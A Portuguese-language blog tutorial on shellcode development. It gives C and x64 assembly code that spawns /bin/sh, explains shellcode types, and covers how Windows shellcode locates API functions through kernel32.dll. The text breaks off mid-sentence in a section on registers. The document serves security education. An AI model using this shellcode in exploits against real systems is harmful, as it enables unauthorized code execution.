<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Shellcoding 101" /><meta name="author" content="H41stur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/shellcoding101/" /><meta property="og:url" content="https://h41stur.github.io/posts/shellcoding101/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/posts/shellcode101.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-07-18T01:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/posts/shellcode101.png" /><meta property="twitter:title" content="Shellcoding 101" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@H41stur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H41stur"},"dateModified":"2024-07-23T09:53:11-03:00","datePublished":"2024-07-18T01:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"Shellcoding 101","image":"https://h41stur.github.io/img/posts/shellcode101.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/shellcoding101/"},"url":"https://h41stur.github.io/posts/shellcoding101/"}</script><title>Shellcoding 101 | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Shellcoding 101</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Shellcoding 101</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> H41stur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jul 18, 2024, 1:00 AM -0300" >Jul 18, 2024<i class="unloaded">2024-07-18T01:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 23, 2024, 9:53 AM -0300" >Jul 23, 2024<i class="unloaded">2024-07-23T09:53:11-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="17153 words">95 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/posts/shellcode101.png" alt="Shellcoding 101" /></p><h1 id="tldr">TL;DR</h1><p>Neste artigo, exploramos os fundamentos do desenvolvimento de <em>shellcodes</em>, focando principalmente no ambiente Windows e na manipulação de endereços dinâmicos. O <em>shellcoding</em> envolve escrever pequenos pedaços de código em assembly para explorar vulnerabilidades e executar comandos diretamente no sistema alvo. Explicamos conceitos básicos como registradores, instruções de assembly e <em>syscalls</em>, e detalhamos a estrutura interna da DLL kernel32.dll, incluindo como localizar e utilizar funções críticas como <code class="language-plaintext highlighter-rouge">WinExec()</code>. Também abordamos a importância das estruturas <code class="language-plaintext highlighter-rouge">TEB</code> e <code class="language-plaintext highlighter-rouge">PEB</code> e mostramos como encontrar os RVAs das funções necessárias para criar <em>shellcodes</em> robustos e adaptáveis. Este artigo fornece uma base sólida para iniciantes e profissionais experientes em hacking, capacitando-os a identificar e explorar vulnerabilidades de segurança de forma eficaz e criativa.</p><h1 id="introdução">Introdução</h1><p>Este artigo começou com a ideia de transmitir um conhecimento básico sobre a criação de <em>shellcodes</em> em ambientes Linux e Windows. Porém, como boa parte dos artigos que inicio, acabou tomando proporções maiores.</p><p>Decidi, no meio do caminho, me aprofundar mais sobre <em>shellcode</em> em ambiente Windows, mergulhando mais profundamente no nível e explorando um pouco mais as APIs e bibliotecas do SO. O artigo começa com o Linux, pois é um processo mais simples, porém a maior parte de todo o conteúdo se foca no ambiente Windows.</p><p>Definitivamente este artigo não funciona sozinho no processo de aprendizagem. Ele exige que a prática ocorra em paralelo, pois alguns conceitos podem se tornar complexos para entendimento só com leitura.</p><p>Até então, eu não havia encontrado algo em português brasileiro com este tipo de conteúdo detalhado, portanto decidi explorar passo a passo minuciosamente. Neste caso, se alguma parte do processo não seja entendida, eu recomendo respirar, e ler novamente, e novamente, e novamente até o entendimento (não esqueça da prática).</p><p>Assim como tudo no <em>hacking</em>, escrever este artigo me rendeu muita diversão e espero que você que esteja lendo e replicando, também se divirta aprendendo.</p><p>Portanto, boa leitura e boa sorte!</p><h1 id="introdução-ao-shellcode">Introdução ao <em>Shellcode</em></h1><p><em>Shellcode</em> é um termo utilizado na segurança cibernética para descrever uma sequência de instruções de máquina que, quando executadas, geralmente abrem uma <em>shell</em> (linha de comando). Este código é frequentemente usado por atacantes para explorar vulnerabilidades em software, permitindo-lhes executar comandos arbitrários no sistema comprometido. No entanto, na prática moderna, o <em>shellcode</em> é um código em <em>byte</em> inserido em um exploit e pode realizar diversas outras tarefas além de abrir uma <em>shell</em>, como escalar privilégios, criar <em>backdoors</em> ou exfiltrar dados.</p><h1 id="o-que-é-shellcode">O que é <em>Shellcode</em>?</h1><p><em>Shellcode</em> é essencialmente um <em>payload</em> injetado em um sistema alvo através de um <em>exploit</em> seja explorando uma vulnerabilidade ou se aproveitando de falhas de configuração. Ele é escrito em linguagem Assembly, o que permite controle granular sobre o comportamento do sistema. Os principais objetivos do <em>shellcode</em> incluem:</p><ul><li><strong>Execução de comandos arbitrários</strong>: Permitir ao atacante executar comandos diretamente no sistema alvo.<li><strong>Manipulação do sistema</strong>: Modificar arquivos, ajustar permissões ou alterar a configuração do sistema.<li><strong>Comunicação com sistemas remotos</strong>: Estabelecer conexões com servidores de comando e controle (C2) para receber instruções adicionais.</ul><h2 id="principais-características-do-shellcode">Principais Características do <em>Shellcode</em></h2><ul><li><strong>Pequeno e eficiente</strong>: <em>Shellcodes</em> são projetados para ser compactos e rápidos para garantir que eles possam ser injetados e executados sem detecção.<li><strong>Independente de plataforma</strong>: Embora o <em>shellcode</em> precise ser escrito para a arquitetura específica do alvo (x86, x64, ARM, etc.), ele pode ser adaptado para diferentes sistemas operacionais.<li><strong>Autossuficiente</strong>: O <em>shellcode</em> normalmente inclui todas as instruções necessárias para realizar sua tarefa sem depender de bibliotecas externas.</ul><h2 id="como-funciona">Como Funciona?</h2><p><em>Shellcode</em> funciona aproveitando vulnerabilidades e falhas em software para inserir e executar código malicioso. O processo envolve geralmente as seguintes etapas:</p><ol><li><strong>Identificação da Vulnerabilidade</strong>: O atacante encontra uma vulnerabilidade no software alvo, como um <em>buffer overflow</em>, que permite a injeção de código.<li><strong>Injeção do <em>Shellcode</em></strong>: Utilizando a vulnerabilidade, o atacante injeta o <em>shellcode</em> na memória do programa alvo.<li><strong>Execução do <em>Shellcode</em></strong>: O programa vulnerável é manipulado para executar o <em>shellcode</em>. Isso pode envolver a sobrescrição do ponteiro de retorno de função para redirecionar a execução para o <em>shellcode</em>.<li><strong>Execução da Tarefa Maliciosa</strong>: Uma vez que o <em>shellcode</em> é executado, ele realiza as tarefas designadas pelo atacante, como abrir uma <em>shell</em> ou conectar-se a um servidor remoto.</ol><h3 id="exemplo-prático">Exemplo Prático</h3><p>Para ilustrar, considere um <em>buffer overflow</em> clássico onde o <em>buffer</em> de um programa é preenchido além de sua capacidade. O atacante pode injetar o <em>shellcode</em> no espaço de memória excedente e manipular o fluxo de execução para pular para o início do <em>shellcode</em>, executando-o.</p><p>Ha tempos atrás, escrevi uma série de artigos sobre exploração de <em>buffer overflow</em> em sistemas Linux e Windows:</p><ul><li><a href="https://h41stur.com/posts/std-bof/">Linux Buffer Overflow - Parte 1 Shellcode em Assembly</a><li><a href="https://h41stur.com/posts/std-bof-2/">Linux Buffer Overflow - Parte 2 Simples BOF</a><li><a href="https://h41stur.com/posts/std-bof-3/">Linux Buffer Overflow - Parte 3 Bypass de Proteções</a><li><a href="https://h41stur.com/posts/std-winbof-1/">Windows Vulnserver Buffer Overflow - Parte 1 Objetivos e Análise do Código</a><li><a href="https://h41stur.com/posts/std-winbof-2/">Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF</a><li><a href="https://h41stur.com/posts/std-winbof-3/">Windows Vulnserver Buffer Overflow - Parte 3 Saltos na Memória</a><li><a href="https://h41stur.com/posts/std-winbof-4/">Windows Vulnserver Buffer Overflow - Parte 4 Bypass do SEH</a><li><a href="https://h41stur.com/posts/std-winbof-5/">Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket</a><li><a href="https://h41stur.com/posts/std-winbof-6/">Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão</a></ul><h2 id="tipos-de-shellcode">Tipos de <em>Shellcode</em></h2><p>Os <em>shellcodes</em> podem ser classificados com base na localização do alvo e no método de injeção:</p><ol><li><p><strong><em>Local Shellcode</em></strong>:</p><ul><li>Executado no mesmo sistema onde o <em>exploit</em> é acionado.<li>Utilizado principalmente em explorações que requerem acesso físico ou lógico ao sistema.</ul><li><p><strong><em>Remote Shellcode</em></strong>:</p><ul><li>Enviado através de uma rede para explorar uma máquina remota.<li>Comumente usado em ataques a serviços de rede, como servidores web ou aplicativos baseados em rede.</ul><li><p><strong><em>Staged Shellcode</em></strong>:</p><ul><li>Dividido em múltiplos estágios.<li>O primeiro estágio é pequeno e apenas o suficiente para baixar ou carregar o segundo estágio, que contém a carga útil completa.<li>Utilizado para evitar detecção e facilitar a injeção em espaços de memória limitados.</ul><li><p><strong><em>Egghunt Shellcode</em></strong>:</p><ul><li>Utilizado quando há uma quantidade limitada de espaço para injetar o <em>shellcode</em>.<li>Consiste em um pequeno código que “caça” ou procura o verdadeiro <em>shellcode</em> em outra parte da memória.</ul></ol><h2 id="o-que-é-preciso-saber-para-criar-um-shellcode">O que é preciso saber para criar um <em>Shellcode</em>?</h2><p>Criar um <em>shellcode</em> eficaz requer conhecimento razoável de várias áreas:</p><ol><li><p><strong>Linguagens C e Assembly</strong>:</p><ul><li>Habilidade para escrever código eficiente e compacto em Assembly.<li>Compreensão das instruções de máquina e registradores.</ul><li><p><strong>Arquitetura de Sistemas</strong>:</p><ul><li>Conhecimento sobre a arquitetura da CPU alvo (x86, x64, ARM, etc.).<li>Compreensão dos mecanismos de gerenciamento de memória e estrutura do sistema operacional.</ul><li><p><strong>Ferramentas de Desenvolvimento e Debugging</strong>:</p><ul><li>Familiaridade com ferramentas como <code class="language-plaintext highlighter-rouge">nasm</code>, <code class="language-plaintext highlighter-rouge">gdb</code>, <code class="language-plaintext highlighter-rouge">objdump</code>, e <code class="language-plaintext highlighter-rouge">strace</code>.<li>Habilidade para compilar, depurar e analisar código Assembly.</ul><li><p><strong>Conhecimento de Sistemas Operacionais</strong>:</p><ul><li>Entendimento das chamadas de sistema (<em>syscalls</em>) específicas do SO alvo.<li>Compreensão das particularidades dos sistemas operacionais (Linux, Windows, etc.).</ul></ol><h2 id="por-que-assembly">Por que Assembly?</h2><p>Existem várias características que tornam o Assembly a melhor escolha para se criar um <em>shellcode</em>.</p><p>Linguagens de alto nível, como C, Python ou Java, abstraem muitos detalhes do hardware, o que pode impedir a execução precisa das operações. Já o Assembly oferece um controle direto sobre o <em>hardware</em> e os recursos do sistema. Isso permite aos desenvolvedores de <em>shellcode</em> manipular registradores, memória e instruções de CPU com precisão.</p><p>Outra característica que faz do assembly a melhor escolha, é o tamanho do <em>shellcode</em>, que deve ter o menor tamanho possível, pois muitas vezes o espaço para injeção é pequeno. E justamente pela abstração das outras linguagens, o <em>shellcode</em> pode ficar muito extenso.</p><p>Para exemplificar, criaremos o mesmo programa em C e em Assembly para depois transformá-los em <em>shellcode</em> e comparar as diferenças.</p><p>Abaixo um programa em C que invoca uma <em>shell:</em>:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>

    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>

    <span class="n">execve</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ao compilar e executar, temos um sh:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718201118.png" alt="Shell feito em C" /></p><p>Quando o transformamos em <em>shellcode</em>, vemos que seu tamanho é de <strong>448 Bytes</strong>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718201259.png" alt="Shellcode em C" /></p><p>Agora o mesmo programa criado em ASM:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="nf">xor</span>    <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>             
    <span class="nf">mov</span>    <span class="kt">qword</span> <span class="nb">rbx</span><span class="p">,</span> <span class="err">'</span><span class="o">//</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span><span class="err">'</span>
    <span class="nf">shr</span>    <span class="nb">rbx</span><span class="p">,</span> <span class="mi">8</span>               
    <span class="nf">push</span>   <span class="nb">rbx</span>                  

    <span class="nf">mov</span>    <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span>             
    <span class="nf">push</span>   <span class="nb">rdx</span>                  
    <span class="nf">push</span>   <span class="nb">rdi</span>                  
    <span class="nf">mov</span>    <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsp</span>             
    <span class="nf">mov</span>    <span class="nb">rax</span><span class="p">,</span> <span class="mi">59</span>              
    <span class="nf">syscall</span>                    
</pre></table></code></div></div><p>Ao compilar e executar, também temos um sh:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718201536.png" alt="Shell em ASM" /></p><p>Quando o transformamos em <em>shellcode</em>, vemos que seu tamanho é de <strong>33 Bytes</strong>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718201709.png" alt="Shellcode em ASM" /></p><p>Um <em>shellcode</em> absurdamente menor. Estas características fazem do Assembly a melhor escolha para criação de <em>shellcodes</em>.</p><h2 id="quais-as-diferenças-entre-shellcode-em-windows-e-linux">Quais as diferenças entre <em>Shellcode</em> em Windows e Linux?</h2><p>Escrever <em>shellcode</em> para Windows e Linux envolve algumas diferenças importantes, dado que cada sistema operacional tem sua própria API e mecanismos de chamada de sistema.</p><p>A principal diferença entre os dois sistemas operacionais é a constância dos números de <em>syscalls</em> no Linux em contraste com a variabilidade dos endereços de funções no Windows. No Linux, os números das <em>syscalls</em> permanecem constantes entre as versões do sistema operacional, proporcionando uma estabilidade maior para os desenvolvedores. Eles sabem que uma <em>syscall</em> específica sempre terá o mesmo número, independentemente da versão do kernel. Já no Windows, os endereços das funções podem mudar de uma versão para outra. Essa abordagem permite aos desenvolvedores do Windows fazer alterações no kernel sem quebrar a compatibilidade com programas existentes, pois os programas sempre localizam as funções necessárias dinamicamente nas DLLs.</p><p>A abordagem adotada pelo Windows oferece maior flexibilidade para os desenvolvedores do sistema operacional. Eles podem fazer mudanças no kernel sem causar problemas de compatibilidade com os programas existentes. Se o endereço de uma função mudar, o programa pode simplesmente localizar o novo endereço na DLL. Por outro lado, como o Linux utiliza um sistema de numeração fixo para as <em>syscalls</em>, se os números das <em>syscalls</em> mudassem, muitos desenvolvedores seriam prejudicados, pois teriam que atualizar o código de seus programas para refletir os novos números. Manter os números das <em>syscalls</em> constantes evita isso e garante que o código escrito para uma versão do Linux continuará funcionando em versões futuras.</p><h3 id="shellcode-em-linux">Shellcode em Linux:</h3><p>O Linux, ao contrário do Windows, fornece uma maneira direta de interagir com o kernel por meio da interface <code class="language-plaintext highlighter-rouge">int 0x80</code>. Essa interface permite que programas façam chamadas de sistema (<em>syscalls</em>) diretamente ao kernel. Uma <em>syscall</em> é uma função fornecida pelo kernel que permite a execução de operações de baixo nível, como ler ou escrever arquivos, alocar memória e realizar outras tarefas essenciais. No Linux, existe uma tabela de <em>syscalls</em> onde cada <em>syscall</em> é associada a um número único. Por exemplo, a <em>syscall</em> <code class="language-plaintext highlighter-rouge">execve</code> tem o número 11. Esses números de <em>syscalls</em> são consistentes e permanecem constantes entre as versões do sistema operacional. Isso significa que a <em>syscall</em> <code class="language-plaintext highlighter-rouge">execve</code> sempre terá o número 11, independentemente da versão do kernel ou da distribuição do Linux. Essa constância oferece estabilidade para os desenvolvedores, pois sabem que uma <em>syscall</em> específica terá sempre o mesmo número, facilitando o desenvolvimento e a manutenção de software.</p><ol><li><p><strong>Chamadas de Sistema (Syscalls)</strong>:</p><ul><li>No Linux, as <em>syscalls</em> são invocadas diretamente utilizando a instrução <code class="language-plaintext highlighter-rouge">int 0x80</code> (x86) ou <code class="language-plaintext highlighter-rouge">syscall</code> (x64).<li><em>Shellcodes</em> Linux costumam ser menores e mais diretos porque interagem diretamente com o kernel.</ul><li><p><strong>Convencionais de Registro</strong>:</p><ul><li>Utilização direta dos registradores (<code class="language-plaintext highlighter-rouge">eax</code>, <code class="language-plaintext highlighter-rouge">ebx</code>, <code class="language-plaintext highlighter-rouge">ecx</code>, etc.) para passar argumentos para <em>syscalls</em>.</ul><li><p><strong>Ambiente mais Simples</strong>:</p><ul><li>Menos dependência de bibliotecas externas e estruturas complexas.</ul></ol><h3 id="shellcode-em-windows">Shellcode em Windows:</h3><p>Por outro lado, o Windows não fornece uma interface direta com o kernel como o Linux. Em vez disso, para realizar operações de baixo nível, o Windows utiliza funções fornecidas por bibliotecas de vínculo dinâmico, as DLLs (<em>Dynamic Link Libraries</em>). Para chamar essas funções, um programa precisa primeiro encontrar o endereço da função na DLL carregada. Esse processo é feito dinamicamente durante a execução do programa. No Windows, os endereços das funções nas DLLs podem variar entre diferentes versões do sistema operacional. Isso significa que a função <code class="language-plaintext highlighter-rouge">CreateFile</code>, por exemplo, pode estar em um endereço diferente no Windows 10 em comparação com o Windows 11. Por essa razão, um <em>shellcode</em> ou qualquer programa que utilize essas funções precisa conseguir localizar dinamicamente os endereços das funções que deseja usar.</p><ol><li><p><strong>API do Windows (WinAPI)</strong>:</p><ul><li><em>Shellcodes</em> em Windows frequentemente utilizam a API do Windows para realizar tarefas.<li>Isso pode resultar em <em>shellcodes</em> mais complexos devido à necessidade de resolver endereços de funções dinamicamente.</ul><li><p><strong><em>Structured Exception Handling</em> (SEH)</strong>:</p><ul><li>Mecanismo de tratamento de exceções estruturadas que pode ser explorado ou necessita ser evitado.</ul><li><p><strong>Registro e Convenções de Chamada</strong>:</p><ul><li>Utilização do <em>stack</em> e registradores de forma específica conforme a convenção de chamada utilizada (<em>stdcall, cdecl</em>, etc.).</ul><li><p><strong>Proteções Adicionais</strong>:</p><ul><li>Windows geralmente possui mais mecanismos de proteção como DEP (<em>Data Execution Prevention</em>) e ASLR (<em>Address Space Layout Randomization</em>) que precisam ser considerados.</ul></ol><h3 id="encontrando-endereços-de-funções-dll-no-windows">Encontrando Endereços de Funções DLL no Windows</h3><p>No Windows, localizar os endereços das funções necessárias em DLLs pode ser um desafio, considerando especialmente as atualizações e mudanças que ocorrem com novos <em>service packs</em>.</p><h4 id="métodos-de-endereçamento-de-funções">Métodos de Endereçamento de Funções</h4><p>Existem duas abordagens principais para endereçar funções em <em>shellcode</em>: usar endereços codificados ou encontrar as funções em tempo de execução.</p><ol><li><strong>Endereços Codificados</strong>:<ul><li>Esta abordagem, envolve codificar diretamente os endereços das funções no <em>shellcode</em>. Isso significa que o <em>shellcode</em> contém os endereços exatos das funções que ele precisa usar. Esta característica implica no fato de que um <em>shellcode</em> só irá funcionar em uma versão idêntica do sistema operacional no qual foi desenvolvido, ou seja, a mesma versão de Windows, com as mesmas atualizações e os mesmos <em>patches</em>.</ul><li><strong>Tempo de Execução</strong>:<ul><li>Neste método, o <em>shellcode</em> calcula dinamicamente os endereços das funções necessárias enquanto está sendo executado. Isso garante que ele possa se adaptar a diferentes versões do sistema operacional, pois os endereços são resolvidos no momento da execução, independentemente das mudanças introduzidas por atualizações ou <em>patches</em>.</ul></ol><h4 id="utilizando-kernel32dll">Utilizando kernel32.dll</h4><p>A única DLL que é garantidamente mapeada no espaço de endereço de um processo é a <code class="language-plaintext highlighter-rouge">kernel32.dll</code>. Esta DLL é crucial porque contém duas funções essenciais: <code class="language-plaintext highlighter-rouge">LoadLibrary</code> e <code class="language-plaintext highlighter-rouge">GetProcAddress</code>. <code class="language-plaintext highlighter-rouge">LoadLibrary</code> permite carregar outras DLLs no espaço de endereço do processo, enquanto <code class="language-plaintext highlighter-rouge">GetProcAddress</code> é usada para encontrar os endereços das funções exportadas por essas DLLs.</p><p>Essas duas funções são fundamentais porque, uma vez que você tenha o endereço de <code class="language-plaintext highlighter-rouge">LoadLibrary</code>, você pode carregar qualquer outra DLL que precisar. Da mesma forma, com o endereço de <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, você pode localizar qualquer função dentro dessas DLLs carregadas.</p><h4 id="desafios-com-endereços-codificados">Desafios com Endereços Codificados</h4><p>Um problema significativo com o uso de endereços codificados é que os deslocamentos de endereço podem mudar com cada nova versão do Windows, incluindo <em>service packs</em> e <em>patches</em>. Isso ocorre porque, ao atualizar ou modificar o sistema operacional, os desenvolvedores da Microsoft podem reorganizar como as DLLs são carregadas na memória, alterando os endereços das funções.</p><p>Consequentemente, se você optar por utilizar endereços codificados, seu <em>shellcode</em> será específico para uma versão exata do Windows. Qualquer mudança na versão do sistema operacional poderá invalidar os endereços codificados, fazendo com que o <em>shellcode</em> falhe ao tentar localizar e chamar as funções necessárias.</p><h1 id="informações-básicas">Informações Básicas</h1><p>Por mais que o intuito deste artigo não seja o de abordar a fundo a arquitetura de processadores, é importante abordarmos alguns tópicos base.</p><h2 id="arquiteturas">Arquiteturas</h2><p>Para otimizar as instruções no processamento, a CPU possui um conjunto de registradores. Estes registradores têm uma largura específica que muda conforme a arquitetura.</p><p><code class="language-plaintext highlighter-rouge">x86</code> = Processadores de 32 bits = 4 bytes de largura.<br /> <code class="language-plaintext highlighter-rouge">x64</code> = Processadores de 64 bits = 8 bytes de largura.</p><h3 id="conceitos-básicos">Conceitos Básicos</h3><p>Antes de mergulharmos no desenvolvimento de <em>shellcode</em>, é importante entender alguns conceitos fundamentais:</p><ul><li><strong>Registradores</strong>: São pequenos locais de armazenamento na CPU usados para operações rápidas. Registradores comuns incluem <code class="language-plaintext highlighter-rouge">EAX</code>, <code class="language-plaintext highlighter-rouge">EBX</code>, <code class="language-plaintext highlighter-rouge">ECX</code>, etc.<li><strong>Instruções de Assembly</strong>: Conjunto de instruções que a CPU pode executar diretamente. Exemplos incluem <code class="language-plaintext highlighter-rouge">MOV</code>, <code class="language-plaintext highlighter-rouge">XOR</code>, <code class="language-plaintext highlighter-rouge">PUSH</code>, <code class="language-plaintext highlighter-rouge">POP</code>.<li><strong>Chamadas de Sistema (<em>Syscalls</em>)</strong>: Interfaces fornecidas pelo sistema operacional que permitem que os programas solicitem serviços do kernel, como abrir arquivos, executar processos, etc.</ul><h3 id="registradores">Registradores</h3><div class="table-wrapper"><table><thead><tr><th>64 bits = 8 bytes<th>32 bits = 4 bytes<th>16 bits = 2 bytes<th>8 bits = 1 byte<tbody><tr><td>RAX - Acumulator<td>EAX<td>AX<td>AH ~ AL<tr><td>RBX - Base<td>EBX<td>BX<td>BH ~ BL<tr><td>RCX - Counter<td>ECX<td>CX<td>CH ~ CL<tr><td>RDX - Data<td>EDX<td>DX<td>DH ~ DL<tr><td><strong>RSI</strong> - Source Index<td>ESI<td>SI<td> <tr><td><strong>RDI</strong> - Destination Index<td>EDI<td>DI<td> <tr><td><strong>RSP</strong> - Stack Pointer<td>ESP<td>SP<td> <tr><td><strong>RBP</strong> - Base Pointer<td>EBP<td>BP<td> <tr><td><strong>RIP</strong> - Instruction Pointer<td>EIP<td>IP<td> <tr><td>R8 ~ R15<td> <td> <td> </table></div><p><strong>Tabela1:</strong> Registradores em arquiteturas diferentes.</p><p>Semanticamente, cada registrador tem sua própria função, porém, como consenso, a depender da utilização, os registradores <code class="language-plaintext highlighter-rouge">RAX, RBX, RCX, e RDX</code> são utilizados por propósito geral (GPRs - <em>General Purpose Register</em>), por poderem ser repositórios para armazenar variáveis e informações. Já os registradores <code class="language-plaintext highlighter-rouge">RSI, RDI, 